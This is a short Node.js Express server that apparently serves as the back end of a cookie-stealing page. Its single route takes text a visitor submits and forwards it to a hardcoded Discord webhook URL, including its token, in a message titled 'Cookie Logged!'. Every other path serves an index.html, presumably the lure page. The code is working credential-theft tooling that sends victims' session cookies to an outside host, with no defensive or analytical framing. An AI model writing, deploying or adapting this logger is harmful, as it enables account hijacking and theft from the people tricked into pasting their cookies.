const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static(__dirname));


app.post('/api/send-to-discord', async (req, res) => {
  try {
    const response = await fetch(
      'https://discordapp.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🍪 Cookie Logged!',
            color: 0x6a00ff,
            description: `**Cookie:**\n\`\`\`${req.body.inputText}\`\`\``,
          }],
        }),
      }
    );
    res.sendStatus(response.ok ? 200 : 500);
  } catch (err) {
    res.sendStatus(500);
  }
});


app.get('*', (req, res) => res.sendFile(__dirname + '/index.html'));

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
